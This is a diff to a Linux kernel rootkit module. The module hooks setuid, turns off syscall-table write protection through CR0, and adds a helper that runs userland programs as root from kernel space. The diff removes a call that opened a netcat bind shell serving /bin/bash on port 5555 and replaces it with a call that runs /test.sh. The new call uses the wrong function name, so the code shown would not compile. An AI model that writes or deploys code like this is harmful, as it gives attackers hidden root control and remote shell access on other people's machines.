@@ -197,6 +197,13 @@ asmlinkage int hacked_setuid(uid_t uid){
 
 /* Module initialization function */
 
+
+static int start_bin_from_userland(char *arg){
+	char *argv[] = { arg, NULL, NULL};
+	static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+}
+
 int rootkit_init(void) { // Start lel rootkit
 	printk("Rootkit Initialized\n");
 
@@ -223,9 +230,7 @@ int rootkit_init(void) { // Start lel rootkit
 
 	write_cr0(read_cr0() | 0x10000); // Turn off memory write to syscall table
 
-        char *argv[] = {"nc", "-e", "/bin/bash", "-lp", "5555"};
-        static char *env[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
-        call_usermodehelper("/usr/bin/nc", argv, env, UMH_NO_WAIT);
+	start_bin_from_user("/test.sh");
 
 	return 0;
 }
